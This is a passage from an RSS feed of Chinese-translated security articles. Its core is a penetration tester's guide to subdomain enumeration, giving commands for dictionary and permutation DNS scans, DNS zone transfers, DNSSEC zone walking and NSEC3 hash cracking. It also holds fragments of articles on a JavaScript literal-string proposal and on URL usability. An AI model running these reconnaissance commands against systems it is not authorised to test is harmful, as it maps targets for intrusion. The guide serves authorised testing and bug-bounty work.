TrustedHTML.createFromLiteral(c);&lt;/code&gt;&lt;h2&gt;限制标签的功能&lt;/h2&gt;&lt;p&gt;另一方法是在标签模板字符串上建立类似的体系，也就是说，可以想象如下代码：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;function trustedUrlizer(templateString) {
 return TrustedUrl.unsafelyCreate(templateString);
}

return trustedUrlizer`https://safe.test/totally/safe/url`;&lt;/code&gt;&lt;p&gt;如果我们也有一种机制使标签函数仅接收模板字符串，这将是很好的，也就是说，trustedUrlizer(formField.value) 将会执行失败 或许还会抛出类型错误。 &lt;/p&gt;&lt;p&gt;Daniel Ehrenberg 在 &lt;a href=&quot;https://github.com/mikewest/tc39-proposal-literals/issues/2&quot;&gt;mikewest/tc39-proposal-literals#2&lt;/a&gt; 中也稍微提了一下：&lt;/p&gt;&lt;p&gt;我想象 API 的表层是这样的：模板标签的第一个参数有个额外的属性：文本，它表明了传入模板的参数是否是个文本类型。我们可以通过将其表示为一个内部插槽，并将其文本作为一个自己的getter来使其变为不可伪造，这可以防止攻击者使用任何具有literal: true属性的旧对象调用您的模板：&lt;/p&gt;&lt;code lang=&quot;js&quot;&gt;// Un-monkey-patchable way to get the getter
let getLiteral = Object.getOwnPropertyDescriptor((_ =&amp;gt; _)``, &quot;literal&quot;).get; 

function literalString(strings, ...keys) {
 if (!getLiteral.call(strings)) throw new Error();
 return String.raw(strings, ...keys);
}&lt;/code&gt;&lt;p&gt;这个 literalString 模板标签就像 String.raw ，但是如果不传入文本的话就会抛出异常。它输出一个文本类型的字符串。这或许是值得推崇的方式来调用需要文本字符串的方法。因为strings对象（及其内部raw对象）被冻结，所以不能破坏文本字符串内容。&lt;/p&gt;&lt;p&gt;为此，我只补充一点，我们希望确保文本在 WebIDL 中被使用的，以便我们对内置标签函数进行强制的检测，但这好像超出了我们今天讨论的范围。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;常见问题&lt;/b&gt;&lt;/h2&gt;&lt;ol&gt;&lt;li&gt;&lt;b&gt;不能只用 Closure 或其它基于时间的检查来做这件事情吗？&lt;/b&gt;&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;是的，实际上谷歌正在内部这样做。参与构建过程的人员希望通过在已经完成的构建时间分析的基础上对客户端检查进行分层来使其更健壮。上面提到的&lt;code class=&quot;inline&quot;&gt;TrustedTypes&lt;/code&gt;也会受益于&lt;code class=&quot;inline&quot;&gt;fromLiteral&lt;/code&gt;构建机制，正如谷歌代码库中的情况表明，这个机制既安全又可用。&lt;/p&gt;&lt;p&gt;&lt;b&gt;2. 我们需要在多大程度上追踪文本？&lt;/b&gt;&lt;/p&gt;&lt;p&gt;一个很好的问题！我很欣慰！ 有一件事我们不需要跟踪，就像使用文字作为对象的关键。也就是说，我非常高兴把{“a”：“value”}和{a：“value”}和obj [“a”] =“value”作为键值相同的值。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;现有技术&lt;/b&gt;&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;被Closure编译器支持的&lt;code class=&quot;inline&quot;&gt;&lt;a href=&quot;https://google.github.io/closure-library/api/goog.string.Const.html&quot;&gt;goog.string.Const&lt;/a&gt;&lt;/code&gt; 。&lt;/li&gt;&lt;li&gt;GWT还提供了&lt;code class=&quot;inline&quot;&gt;&lt;a href=&quot;http://www.gwtproject.org/javadoc/latest/com/google/gwt/safehtml/shared/SafeHtmlUtils.html#fromSafeConstant-java.lang.String-&quot;&gt;SafeHtml.fromSafeConstant&lt;/a&gt;进行&lt;/code&gt;编译时检查。&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/google/safe-html-types/blob/master/doc/safehtml-types.md&quot;&gt;https://github.com/google/safe-html-types/blob/master/doc/safehtml-types.md&lt;/a&gt;讲述了在C ++（&lt;code class=&quot;inline&quot;&gt;TrustedResourceUrl::FromConstant&lt;/code&gt;）中类似概念的用法。&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;原文：&lt;a href=&quot;https://github.com/mikewest/tc39-proposal-literals&quot;&gt;mikewest/tc39-proposal-literals&lt;/a&gt;&lt;/p&gt;</description>
<author>Twosecurity</author>
<guid isPermaLink="false">2017-11-21-31237220</guid>
<pubDate>Tue, 21 Nov 2017 00:00:00 +0800</pubDate>
</item>
<item>
<title>渗透测试向导—子域名枚举技术</title>
<link>https://henix.github.io/feeds/zhuanlan.c_123166696/2017-11-18-31160156.htm</link>
<description>&lt;meta charset=&quot;utf-8&quot;&gt;
&lt;title&gt;渗透测试向导—子域名枚举技术&lt;/title&gt;
&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/31160156&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-bc7e2fcd9dde69b5b6baa53429c94821_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;作为一名渗透测试者或专业的漏洞赏金猎人，大多数情况下，当开始测试时仅仅知道一个域名或一系列域名。但是我们必须要展开广泛的侦查才能发现更多有意义的东西，例如服务器、web 应用程序、属于目标组织的域等等，以便有更多的机会发现漏洞。&lt;/p&gt;&lt;p&gt;我写了篇介绍开源情报收集技术的&lt;a href=&quot;https://blog.appsecco.com/open-source-intelligence-gathering-101-d2861d4429e3&quot;&gt;博文&lt;/a&gt;，这种方法被广泛的应用在侦查阶段。&lt;/p&gt;&lt;p&gt;子域名枚举是信息侦查阶段中关键的一部分。本文以简洁的方式介绍了几种子域名枚举技术。&lt;/p&gt;&lt;p&gt;在  Gitbook 上将发表这一主题的文章来深入探讨这些技术。我们在2017年 Bugcrowd LevelUp 会议的“ &lt;a href=&quot;https://github.com/appsecco/bugcrowd-levelup-subdomain-enumeration&quot;&gt;Esoteric sub-domain enumeration&lt;br&gt;techniques&lt;/a&gt; ” 议题中也谈到了这些技巧。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;什么是子域名枚举？&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;子域名枚举是查找一个或多个域的子域的过程。这是侦察阶段的重要组成部分。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;为什么要进行子域名枚举？&lt;/b&gt;&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;子域名枚举可以在测试范围内发现更多的域或子域，这将增大漏洞发现的几率。&lt;/li&gt;&lt;li&gt;有些隐藏的、被忽略的子域上运行的应用程序可能帮助我们发现重大漏洞。&lt;/li&gt;&lt;li&gt;在同一个组织的不同域或应用程序中往往存在相同的漏洞。&lt;/li&gt;&lt;/ul&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-159a0ef7b363ea41dd428fcf2b190547_r.jpg&quot; data-caption=&quot;Yahoo! 由于在 yahoo.com 子域上部署了易受攻击的程序导致了 Voice hack。&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;751&quot; data-rawheight=&quot;104&quot;&gt;&lt;h2&gt;&lt;b&gt;子域名枚举方法&lt;/b&gt;&lt;/h2&gt;&lt;ol&gt;&lt;li&gt;Google 和 Bing 等搜索引擎支持各种高级搜索来优化搜索查询。这些搜索语法通常被称为“Google dorks”。&lt;/li&gt;&lt;/ol&gt;&lt;ul&gt;&lt;li&gt;我们可以在 Google 搜索中使用“site：” 关键字来查找某个域的所有子域。谷歌还支持额外参数来排除我们不感兴趣的子域名，例如 “site：*.wikimedia.org -www -store -jobs -uk”，就排除了  &lt;a href=&quot;http://www.wikimedia.xn--orgstore-hm3g.wikimedia.xn--orgjobs-0o3f.wikimedia.xn--orguk-3t3d.wikimedia.org/&quot;&gt;www.wikimedia.org、store.wikimedia.org、jobs.wikimedia.org、uk.wikimedia.org&lt;/a&gt; 等域。&lt;/li&gt;&lt;/ul&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-aa7995bead8b1cff63a2938d5d4a6c24_r.jpg&quot; data-caption=&quot;使用 site 关键字在google搜索中找到的域名。&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;571&quot; data-rawheight=&quot;636&quot;&gt;&lt;ul&gt;&lt;li&gt;Bing 搜索引擎也支持一些高级搜索。与 Google 一样，Bing 也支持 “site：” 运算符，或许您可能希望排除 Google 搜索的结果。&lt;/li&gt;&lt;/ul&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-6213135440dc967510c57ade914a385f_r.jpg&quot; data-caption=&quot;使用 “site” 关键字在bing搜索引擎中找到的子域名。&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;500&quot; data-rawheight=&quot;832&quot;&gt;&lt;p&gt;2、 有许多拥有大量 DNS 数据集的第三方服务，可通过他们来检索给定域的子域。&lt;/p&gt;&lt;ul&gt;&lt;li&gt;VirusTotal 运行自己的被动 DNS 复制服务，它是通过存储用户提交的 URL 解析结果来建立的。为了检索域的信息，你只需要在搜索栏中输入域名&lt;/li&gt;&lt;/ul&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-11ea245cd7bd281ebac8eb99fb0f6354_r.jpg&quot; data-caption=&quot;使用 virustotal 收集子域名&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;758&quot; data-rawheight=&quot;583&quot;&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-da125dd65fb58fa957f54e2f7b7f43e2_r.jpg&quot; data-caption=&quot;在 VirusTotla 中发现的子域名&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;452&quot; data-rawheight=&quot;450&quot;&gt;&lt;ul&gt;&lt;li&gt;DNSdumpster 是另一个有趣的工具，可以挖掘出指定域潜藏的大量子域。&lt;/li&gt;&lt;/ul&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-d4a5f59f9546712dfce8da5127c73090_r.jpg&quot; data-caption=&quot;使用DNSdumpster搜索子域&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;956&quot; data-rawheight=&quot;601&quot;&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/aboul3la/Sublist3r&quot;&gt;Sublist3r&lt;/a&gt; 是一个流行的工具，它使用各种资源来枚举子域。通过诸如 Google，Yahoo，Bing，百度和 Ask 等许多搜索引擎来枚举。Sublist3r 还使用 Netcraft，Virustotal，ThreatCrowd，DNSdumpster 和 ReverseDNS 等第三方服务来枚举子域。&lt;/li&gt;&lt;/ul&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-73b870ebbc5b92628a1aa10d56ef99eb_r.jpg&quot; data-caption=&quot;使用 sublist3r 枚举子域&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;683&quot; data-rawheight=&quot;501&quot;&gt;&lt;p&gt;3、 &lt;a href=&quot;https://zh.wikipedia.org/zh-cn/%E8%AF%81%E4%B9%A6%E9%80%8F%E6%98%8E%E5%BA%A6&quot;&gt;证书透明&lt;/a&gt;度（Certificate Transparency，CT）是一个实验性的 IETF 开源标准和开源框架，证书颁发机构（Certificate Authority，CA）必须将每个 SSL 或 TLS 证书发布到公共日志中。SSL 或 TLS 证书通常包含域名，子域名和电子邮件地址。这使得它们成为攻击者的信息宝库。我在“证书透明度”一书中撰写了一系列技术性博客文章，深入介绍了这一技术，您可以在&lt;a href=&quot;https://blog.appsecco.com/certificate-transparency-the-bright-side-and-the-dark-side-8aa47d9a6616&quot;&gt;这里&lt;/a&gt;阅读本系列文章。&lt;/p&gt;&lt;p&gt;使用收集 CT（Certificate Transparency）日志的搜索引擎，是发现某个域证书最简单的方法。以下是一些流行的搜索引擎：&lt;/p&gt;&lt;p&gt;1. &lt;a href=&quot;https://crt.sh/&quot;&gt;https://crt.sh/&lt;/a&gt;&lt;/p&gt;&lt;p&gt;2. &lt;a href=&quot;https://censys.io/&quot;&gt;https://censys.io/&lt;/a&gt;&lt;/p&gt;&lt;p&gt;3. &lt;a href=&quot;https://developers.facebook.com/tools/ct/&quot;&gt;https://developers.facebook.com/tools/ct/&lt;/a&gt;&lt;/p&gt;&lt;p&gt;4. &lt;a href=&quot;https://www.google.com/transparencyreport/https/ct/&quot;&gt;https://google.com/transparencyreport/https/ct/&lt;/a&gt;&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-3a38f11839de3da4b2ca61df9f8c1e30_r.jpg&quot; data-caption=&quot;使用crt.sh查找某个组织主域下的子域名&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;800&quot; data-rawheight=&quot;273&quot;&gt;&lt;p&gt;我们编写了几个脚本来简化使用 CT 日志搜索引擎查找子域的过程。脚本在我们的 &lt;a href=&quot;https://github.com/appsecco/bugcrowd-levelup-subdomain-enumeration&quot;&gt;github&lt;/a&gt; &lt;a href=&quot;https://github.com/appsecco/bugcrowd-levelup-subdomain-enumeration&quot;&gt;仓库&lt;/a&gt;中可用。&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-8478731bf106eb1a472ebe311648693a_r.jpg&quot; data-caption=&quot;来自uber.com CT日志的子域&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;478&quot; data-rawheight=&quot;197&quot;&gt;&lt;p&gt;使用 CT 进行子域枚举的不利之处在于，在 CT 日志中找到的域名可能不再存在，因此无法解析为 IP 地址。您可以使用像 &lt;b&gt;&lt;a href=&quot;https://github.com/blechschmidt/massdns&quot;&gt;massdns&lt;/a&gt;&lt;/b&gt; 这样的工具，结合 CT 日志来快速识别可解析的域名。&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;# ct.py - extracts domain names from CT Logs(shipped
with massdns)

# massdns - will find resolvable domains &amp;amp; adds them to a file 
./ct.py icann.org | ./bin/massdns -r resolvers.txt -t
A -q -a -o -w icann_resolvable_domains.txt -&lt;/code&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-55a0c5dc10c1799c1325b9167990738c_r.jpg&quot; data-caption=&quot;使用massdns来查找可解析的域名&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;800&quot; data-rawheight=&quot;303&quot;&gt;&lt;p&gt;4、 基于字典的枚举是另一种查找具有通用名称的子域的技术。&lt;a href=&quot;https://github.com/darkoperator/dnsrecon&quot;&gt;DNSRecon&lt;/a&gt; 是一个功能强大的 DNS 枚举工具，它的一个特点是使用预定义的单词表进行基于字典的子域枚举。&lt;/p&gt;&lt;code lang=&quot;python&quot;&gt;$ python dnsrecon.py -n ns1.insecuredns.com -d insecuredns.com -D subdomains-top1mil-5000.txt -t brt&lt;/code&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-979fce8e4bf8e76850ada5662ea864af_r.jpg&quot; data-caption=&quot;使用DNSRecon的基于字典的枚举&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1042&quot; data-rawheight=&quot;269&quot;&gt;&lt;p&gt;5、 置换扫描是识别子域的另一个有趣的技术。在这项技术中，我们使用已知域或子域的组合来确定新的子域。&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/infosec-au/altdns&quot;&gt;Altdns&lt;/a&gt; 是一个可以发现符合既定模式的子域的工具&lt;/li&gt;&lt;/ul&gt;&lt;code lang=&quot;text&quot;&gt;$ python altdns.py -i icann.domains -o data_output -w
icann.words -r -s results_output.txt &lt;/code&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-eb01c3135fae85cd5f5e93d782c9bace_r.jpg&quot; data-caption=&quot;使用AltDNS查找与某些排列或替换匹配的子域&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;942&quot; data-rawheight=&quot;139&quot;&gt;&lt;p&gt;6、 找到&lt;a href=&quot;https://www.iana.org/assignments/as-numbers&quot;&gt;自治系统编号&lt;/a&gt;（&lt;a href=&quot;https://zh.wikipedia.org/wiki/%E8%87%AA%E6%B2%BB%E7%B3%BB%E7%BB%9F&quot;&gt;ASN&lt;/a&gt;）将有助于我们识别属于某个组织的网络块，该分块可能具有有效的域。&lt;/p&gt;&lt;ul&gt;&lt;li&gt;使用 dig 或 host 来解析给定域的 IP 地址。&lt;/li&gt;&lt;li&gt;可以找到 IP 地址 ASN 的工具：&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href=&quot;https://asn.cymru.com/cgi-bin/whois.cgi&quot;&gt;https://asn.cymru.com/cgi-bin/whois.cgi&lt;/a&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;可以找到域名 ASN 的工具：&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href=&quot;http://bgp.he.net/&quot;&gt;http://bgp.he.net/&lt;/a&gt;&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-1d681670fc50eb265de8359ea2107dfd_r.jpg&quot; data-caption=&quot;使用 IP 地址找到 AS 编号&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;800&quot; data-rawheight=&quot;247&quot;&gt;&lt;ul&gt;&lt;li&gt;找到的 ASN 号码可用于查找域的网络块。Nmap 脚本可以来实现 ：&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href=&quot;https://nmap.org/nsedoc/scripts/targets-asn.html&quot;&gt;https://nmap.org/nsedoc/scripts/targets-asn.html&lt;/a&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;$ nmap --script targets-asn --script-args targets-asn.asn=17012 &amp;gt; netblocks.txt&lt;/code&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-645bd67ed9c65cb3de4f2837e6654708_r.jpg&quot; data-caption=&quot;使用AS编号查找网络块的NSE脚本&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;599&quot; data-rawheight=&quot;265&quot;&gt;&lt;p&gt;7、 区域传输是 DNS 的一种事务，DNS 服务器将全部或部分区域文件的副本传递给另一台 DNS 服务器。如果区域传输没有被安全的配置，任何人都可以启动一个名称服务器的区域传输并获得区域文件的副本。在设计上，区域文件包含大量有关该区域和驻留在区域中主机的信息。&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;$ dig +multi AXFR @ns1.insecuredns.com insecuredns.com&lt;/code&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-9b71cb71d202f9b1dad735eb6ac23dde_r.jpg&quot; data-caption=&quot;使用DIG工具对域名服务器成功地进行区域传输&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;800&quot; data-rawheight=&quot;436&quot;&gt;&lt;p&gt;8、 由于 DNSSEC 处理不存域的方式，可以“漫游” DNSSEC 区域并枚举该区域中的所有域。你可以从&lt;a href=&quot;http://info.menandmice.com/blog/bid/73645/Take-your-DNSSEC-with-a-grain-of-salt&quot;&gt;这里&lt;/a&gt;了解更多关于这个技巧。&lt;/p&gt;&lt;ul&gt;&lt;li&gt;对于使用 NSEC 记录的 DNSSEC 区域，可以使用 &lt;a href=&quot;https://www.nlnetlabs.nl/projects/ldns/&quot;&gt;ldns-walk&lt;/a&gt;等工具执行区域漫游。&lt;/li&gt;&lt;/ul&gt;&lt;code lang=&quot;text&quot;&gt;$ ldns-walk @ ns1.insecuredns.com insecuredns.com&lt;/code&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-814d64794eb086706c642be5243e9120_r.jpg&quot; data-caption=&quot;带NSEC记录的DNSSEC区域&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;736&quot; data-rawheight=&quot;294&quot;&gt;&lt;ul&gt;&lt;li&gt;某些 DNSSEC 区域使用 NSEC3 记录，这些记录使用哈希域名来防止攻击者收集纯文本域名。攻击者可以收集所有的子域哈希值，并在线下破解哈希值。&lt;/li&gt;&lt;li&gt;像 &lt;a href=&quot;https://dnscurve.org/nsec3walker.html&quot;&gt;nsec3walker&lt;/a&gt;这样的工具可以帮助我们自动化收集 NSEC3 哈希和破解哈希。安装 &lt;a href=&quot;https://dnscurve.org/nsec3walker.html&quot;&gt;nsec3walker&lt;/a&gt; &lt;i&gt; href=&quot;https://dnscurve.org/nsec3walker.html&quot;&amp;gt;之后，可以使用以下命令来枚举 NSEC3 保护区的子域。&lt;/i&gt;&lt;/li&gt;&lt;/ul&gt;&lt;code lang=&quot;text&quot;&gt;# Collect NSEC3 hashes of a domain

$ ./collect icann.org &amp;gt; icann.org.collect
# Undo the hashing, expose the sub-domain information.

$ ./unhash &amp;lt; icann.org.collect &amp;gt; icann.org.unhash
# Listing only the sub-domain part from the unhashed data

$ cat icann.org.unhash | grep &quot;icann&quot; | awk &#39;{print $2;}&#39;

del.icann.org.

access.icann.org.

charts.icann.org.

communications.icann.org.

fellowship.icann.org.

files.icann.org.

forms.icann.org.

mail.icann.org.

maintenance.icann.org.

new.icann.org.

public.icann.org.

research.icann.org.
&lt;/code&gt;&lt;p&gt;9、 有些项目收集互联网的扫描数据，并将其提供给研究人员和安全社区。这些数据集是子域信息的宝库。尽管在这个庞大的数据集中查找子域犹如大海捞针，但也是值得的。&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://scans.io/study/sonar.fdns_v2&quot;&gt;正向&lt;/a&gt; &lt;a href=&quot;https://scans.io/study/sonar.fdns_v2&quot;&gt;DNS&lt;/a&gt; 数据集作为 Project Sonar 的一部分发布。这些数据是通过提取来自多个源的域名并且给每个域发送 ANY 请求来收集的。这些数据是 gzip 格式的 json 文件。我们可以解析数据集来查找给定域的子域。数据集是很大的（压缩后约 20 + GB，未压缩约有 300 + GB）。&lt;/li&gt;&lt;/ul&gt;&lt;code lang=&quot;text&quot;&gt;# Command to parse
&amp;amp; extract sub-domains for a given domain
$ curl -silent https://scans.io/data/rapid7/sonar.fdns_v2/20170417-fdns.json.gz | pigz -dc | grep “.icann.org” | jq&lt;/code&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-ec574de9a9862fbf746926751051583f_r.jpg&quot; data-caption=&quot;使用 FDNS 数据集收集子域名&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;800&quot; data-rawheight=&quot;272&quot;&gt;&lt;h2&gt;&lt;b&gt;比较&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;我们用上面谈到的方法来对 icann.org  进行检测并比较一下不同方法带来的结果。下面的条形图展示了使用不同的方法找到唯一且可解析的子域的数目。与我们联系可以了解收集这些信息的方法。&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-c6c1bb2d0b32e7c90cae8e1c245f26ea_r.jpg&quot; data-caption=&quot;不同方法找到的唯一且可解析子域的数目&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;800&quot; data-rawheight=&quot;533&quot;&gt;&lt;h2&gt;&lt;b&gt;整理和收集&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;我们为子域名枚举技术、相关工具和一些资源做了个简单的整理，将所有方法呈现出来方便查找使用：&lt;/p&gt;&lt;p&gt;&lt;i&gt;&lt;a href=&quot;https://gist.github.com/yamakira/2a36d3ae077558ac446e4a89143c69ab&quot;&gt;https://gist.github.com/yamakira/2a36d3ae077558ac446e4a89143c69ab&lt;/a&gt;&lt;/i&gt;&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-12cfa32db92c6c6f8e6981fccc50d2df_r.jpg&quot; data-caption=&quot;简单的整理和搜集&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;690&quot; data-rawheight=&quot;642&quot;&gt;&lt;p&gt;&lt;b&gt;参考&lt;/b&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/appsecco/bugcrowd-levelup-subdomain-enumeration&quot;&gt;https://github.com/appsecco/bugcrowd-levelup-subdomain-enumeration&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://blog.appsecco.com/open-source-intelligence-gathering-101-d2861d4429e3&quot;&gt;https://blog.appsecco.com/open-source-intelligence-gathering-101-d2861d4429e3&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://www.databreaches.net/hackers-post-450k-credentials-apparently-pilfered-from-yahoo/&quot;&gt;https://www.databreaches.net/hackers-post-450k-credentials-apparently-pilfered-from-yahoo/&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;http://info.menandmice.com/blog/bid/73645/Take-your-DNSSEC-with-a-grain-of-salt&quot;&gt;http://info.menandmice.com/blog/bid/73645/Take-your-DNSSEC-with-a-grain-of-salt&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://www.peerlyst.com/posts/bsideslv-2017-breaking-ground-with-underflow-bsides-las-vegas&quot;&gt;https://www.peerlyst.com/posts/bsideslv-2017-breaking-ground-with-underflow-bsides-las-vegas&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;原文：&lt;a href=&quot;https://blog.appsecco.com/a-penetration-testers-guide-to-sub-domain-enumeration-7d842d5570f6&quot;&gt;https://blog.appsecco.com/a-penetration-testers-guide-to-sub-domain-enumeration-7d842d5570f6&lt;/a&gt;&lt;/p&gt;</description>
<author>Twosecurity</author>
<guid isPermaLink="false">2017-11-18-31160156</guid>
<pubDate>Sat, 18 Nov 2017 00:00:00 +0800</pubDate>
</item>
<item>
<title>Some Problems Of URLs</title>
<link>https://henix.github.io/feeds/zhuanlan.c_123166696/2017-11-12-30958554.htm</link>
<description>&lt;meta charset=&quot;utf-8&quot;&gt;
&lt;title&gt;Some Problems Of URLs&lt;/title&gt;
&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/30958554&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;h2&gt;&lt;b&gt;背景&lt;/b&gt; &lt;/h2&gt;&lt;p&gt;统一资源定位符（&lt;a href=&quot;https://tools.ietf.org/html/rfc1738&quot;&gt;URL&lt;/a&gt;）是一种数据结构和相关的序列化格式，其目的是唯一的定位互联网（或其他网络）上的资源。（另请参阅&lt;a href=&quot;https://tools.ietf.org/html/rfc3986&quot;&gt;统一资源标识符&lt;/a&gt;）。这是一个宏大的目标，但 URL 已经或多或少的被证明是易于操作和使用的，真令人感叹！全局命名空间使应用程序变得强大，也使它们之间的交互成为可能。 &lt;/p&gt;&lt;p&gt;但是，URL 在可用性、安全性和经济性方面仍存在一些问题。大多数人都希望全局命名空间能够不断完善。接下来我将全面的谈谈关于 URL 的问题，后面会探讨一些技术细节，你也可以直接跳到后面部分。 &lt;/p&gt;&lt;h2&gt;&lt;b&gt;命名的重要性 &lt;/b&gt;&lt;/h2&gt;&lt;p&gt;URL 的可用性是非常差的，不仅在于其复杂的结构，还在于它模糊、不易阅读（&lt;a href=&quot;https://noncombatant.org/2017/11/07/problems-of-urls/#syntaxyness&quot;&gt;syntaxy&lt;/a&gt;）的表现形式。复杂的结构有时并不是必需的。 &lt;/p&gt;&lt;p&gt;URL 的可用性比较差，这对于像 URL 和 DNS 这样的分布式命名方案的倡导者来说是一种缺陷。人们有时候会提出使用一种集中化的命名方案来减少混乱，从而增强 URL 的可用性和安全性。他们确实提出了一种观点，我们就此来探讨一下。 &lt;/p&gt;&lt;p&gt;例如，我同事&lt;a href=&quot;https://medium.com/@owencm/rethinking-url-bars-as-primary-browser-ui-e2118339d2c0&quot;&gt;欧文▪坎贝尔-摩尔（Owen Campbell-Moore）认为&lt;/a&gt; &lt;a href=&quot;https://medium.com/@owencm/rethinking-url-bars-as-primary-browser-ui-e2118339d2c0&quot;&gt;URL&lt;/a&gt; &lt;a href=&quot;https://medium.com/@owencm/rethinking-url-bars-as-primary-browser-ui-e2118339d2c0&quot;&gt;带来的问题很难避免&lt;/a&gt;，并且希望搜索引擎提供一种信任机制，在对人们有意义的名字和源或 URL 之间做一种映射。 &lt;/p&gt;&lt;p&gt;然而，这需要搜索引擎或其它集中命名机构是值得信任的，做到这一点却很困难： &lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-d1348dedd11af6e4f541fbde8919bd79_r.jpg&quot; data-caption=&quot;“这是可怕的雷区”—— Cristian Vat on Twitter &quot; data-rawwidth=&quot;552&quot; data-rawheight=&quot;459&quot;&gt;&lt;p&gt;同样，谷歌搜索 [&lt;a href=&quot;https://www.google.com/search?q=download+chrome&quot;&gt;下载&lt;/a&gt; &lt;a href=&quot;https://www.google.com/search?q=download+chrome&quot;&gt;Chrom&lt;/a&gt;e ] 的结果虽然大多数是正确合法的，但是在搜索结果的第一页仍然存在一些虚假的东西（至少在我写作的时候和我所能记得的情况）。事实上，我们常常反复遇到这么一个问题，就是最顶端的搜索结果往往是不准确的。谷歌的搜索引擎不能准确的找到谷歌的浏览器，从某种意义上说，谷歌似乎并没有把它放在可信范围之内。哎…… &lt;/p&gt;&lt;p&gt;或许机器学习可以有效的识别这种恶搞，比如通过比较名字和图标的相似度且从人的视角来审视它们的准确性。这将加快发现潜在恶搞信息的过程，提高集中命名机构的可信度，但是我们仍然依赖于权威。 &lt;/p&gt;&lt;p&gt;显然，在这篇的大部分内容中，我都赞同欧文关于 URL 缺陷的观点，但我却不认同采用集中命名机构的做法，也不应该转向另一种解决方案。 &lt;/p&gt;&lt;p&gt;我认为欧文提出的问题可以通过探讨下面这问题来解决： &lt;/p&gt;&lt;p&gt;“源并不是用户友好的” &lt;/p&gt;&lt;p&gt;我完全同意 URL 可用性差这一点，但我认为源（&lt;a href=&quot;https://tools.ietf.org/search/rfc6454&quot;&gt;scheme, host, port tuple&lt;/a&gt;）可以变得更加具有可用性，如果成功的解决了这个技术问题，这将缓解集中命名机构的压力。 &lt;/p&gt;&lt;p&gt;&lt;b&gt;增强源的可用性 &lt;/b&gt;&lt;/p&gt;&lt;p&gt;我们可以通过改变 URL 地址栏的以下几个方面来增强源的可用性： &lt;/p&gt;&lt;ol&gt;&lt;li&gt;仅显示主机名。没有端口和协议，必要情况下也可以考虑只展示有效的 TLD（top level domain,顶级域名）+1 标签，即 eTLD+1。事实上这将被证明是必要的和有用的。 